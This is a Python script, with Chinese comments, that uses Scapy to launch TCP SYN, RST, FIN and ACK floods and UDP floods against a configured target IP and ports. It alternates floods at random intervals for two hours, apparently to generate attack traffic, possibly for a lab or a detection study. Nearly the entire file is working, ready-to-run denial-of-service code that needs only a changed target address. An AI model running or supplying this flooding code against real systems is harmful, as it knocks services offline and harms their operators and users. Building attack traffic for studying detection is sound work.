from scapy.all import IP,TCP,UDP,send
import random
import time
import threading
import internet_info
from numpy import sqrt
#setting
target_ip = "203.0.113.123" #"172.20.10.15" #要攻擊的server IP
running_time=2*60*60 #這個程式執行多久，單位為秒
show_sending_packet=True #顯示有沒有發送封包的訊息
attack_ratio=0.4 #攻擊佔的時間比例期望值
# ############################################################
class SynFlood:
    def __init__(self, my_ip, target_ip, show_sending_packet):
        self.my_ip = my_ip
        self.target_ip = target_ip
        self.target_port = 63209
        self.show_sending_packet = show_sending_packet
        self.duration_range= (5, 10)  # Syn flood duration range in seconds
        self.port_num=20
    def run(self):
        duration = random.uniform(5, 15)
        print(f"Sending TCP SYN flood to {self.target_ip}:{self.target_port}...")
        start_time = time.time()
        while True:
            if time.time() - start_time > duration:
                break
            ip_layer = IP(src=self.my_ip, dst=self.target_ip)
            tcp_layer = TCP(
                sport=random.randint(63000, 63020),
                dport=self.target_port,
                flags="S",
            )
            payload = 0
            packet = ip_layer / tcp_layer / random._urandom(payload)
            send(packet, verbose=self.show_sending_packet)

class UdpFlood:
    def __init__(self, target_ip, show_sending_packet):
        self.target_ip = target_ip
        self.target_port = 63211
        self.show_sending_packet = show_sending_packet
        self.duration_range = (10, 16)
        self.port_num=1
    def run(self):
        duration = random.uniform(10, 16)
        print(f"Sending UDP flood to {self.target_ip}:{self.target_port}...")
        start_time = time.time()
        while True:
            if time.time() - start_time > duration:
                break
            payload = random.randint(64, 1024)
            pkt = IP(dst=self.target_ip) / UDP(dport=self.target_port) / random._urandom(payload)
            send(pkt, verbose=self.show_sending_packet)

class RstFlood:
    def __init__(self, my_ip, target_ip, show_sending_packet):
        self.my_ip = my_ip
        self.target_ip = target_ip
        self.target_port = 63212
        self.show_sending_packet = show_sending_packet
        self.duration_range = (5, 30)
        self.port_num=20
    def run(self):
        duration = random.uniform(5, 30)
        print(f"Sending TCP RST flood to {self.target_ip}:{self.target_port}...")
        start_time = time.time()
        while True:
            if time.time() - start_time > duration:
                break
            ip_layer = IP(src=self.my_ip, dst=self.target_ip)
            tcp_layer = TCP(
                sport=random.randint(63000, 63020),
                dport=self.target_port,
                flags="R",
            )
            payload = 0
            packet = ip_layer / tcp_layer / random._urandom(payload)
            send(packet, verbose=self.show_sending_packet)

class FinFlood:
    def __init__(self, my_ip, target_ip, show_sending_packet):
        self.my_ip = my_ip
        self.target_ip = target_ip
        self.target_port = 63213
        self.show_sending_packet = show_sending_packet
        self.duration_range = (10, 30)
        self.port_num=20
    def run(self):
        duration = random.uniform(10, 30)
        print(f"Sending TCP FIN flood to {self.target_ip}:{self.target_port}...")
        start_time = time.time()
        while True:
            if time.time() - start_time > duration:
                break
            ip_layer = IP(src=self.my_ip, dst=self.target_ip)
            tcp_layer = TCP(
                sport=random.randint(63000, 63020),
                dport=self.target_port,
                flags="F",
            )
            payload = 0
            packet = ip_layer / tcp_layer / random._urandom(payload)
            send(packet, verbose=self.show_sending_packet)

class AckFlood:
    def __init__(self, my_ip, target_ip, show_sending_packet):
        self.my_ip = my_ip
        self.target_ip = target_ip
        self.target_port = 63214
        self.show_sending_packet = show_sending_packet
        self.duration_range = (10, 30)
        self.port_num = 20

    def run(self):
        duration = random.uniform(10, 30)
        print(f"Sending TCP ACK flood to {self.target_ip}:{self.target_port}...")
        start_time = time.time()
        while True:
            if time.time() - start_time > duration:
                break
            ip_layer = IP(src=self.my_ip, dst=self.target_ip)
            tcp_layer = TCP(
                sport=random.randint(63000, 63020),
                dport=self.target_port,
                flags="A",
            )
            payload = 0
            packet = ip_layer / tcp_layer / random._urandom(payload)
            send(packet, verbose=self.show_sending_packet)


def timer_worker():
    time.sleep(running_time)  # 等待指定的運行時間
    # 強制結束主程式（可視需求調整）
    import os
    os._exit(0)

if __name__ == "__main__":
    my_ip = internet_info.my_IP #獲取本機IP
    timer_thread = threading.Thread(target=timer_worker, daemon=True)  
    timer_thread.start()  # 啟動計時器
    syn_flood= SynFlood(my_ip, target_ip, show_sending_packet)
    udp_flood = UdpFlood(target_ip, show_sending_packet)
    rst_flood = RstFlood(my_ip, target_ip, show_sending_packet)
    fin_flood = FinFlood(my_ip, target_ip, show_sending_packet)
    ack_flood = AckFlood(my_ip, target_ip, show_sending_packet)
    attack_methods = [
        ack_flood
    ]

    average_port = 0
    for attack in attack_methods:
        average_port += (attack.duration_range[0] + attack.duration_range[1]) / 2 * attack.port_num
    average_port /= len(attack_methods)
    sleep_time=random.uniform(0,2*(1-attack_ratio)/attack_ratio*average_port)
    print("waiting for next attack ",sleep_time," sec...")
    time.sleep(sleep_time) 
    while True:
        attack_func = random.choice(attack_methods)
        attack_func.run()  # 執行隨機選擇的攻擊方法
        sleep_time=random.uniform(0,2*(1-attack_ratio)/attack_ratio*average_port)
        print("waiting for next attack ", sleep_time," sec...")
        time.sleep(sleep_time)  # 隨機等待時間，模擬攻擊間隔
    timer_thread.join()  # 等待計時器線程結束

